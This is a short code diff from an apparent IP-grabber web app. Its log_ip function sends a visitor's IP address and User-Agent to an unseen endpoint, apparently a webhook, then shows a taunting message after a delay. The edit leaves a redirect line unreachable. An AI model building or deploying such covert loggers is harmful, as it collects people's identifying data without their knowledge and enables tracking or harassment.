@@ -27,9 +27,11 @@ def log_ip():
         "content": f"IP: {ip}\nUser-Agent: {user_agent}"
     })
 
-    return "Ooops GENGA ip logged you😂"
+    
     
     time.sleep(10)
+
+    return "Ooops GENGA ip logged you😂"
 
     return redirect("https://gengaog.github.io/-/")
 
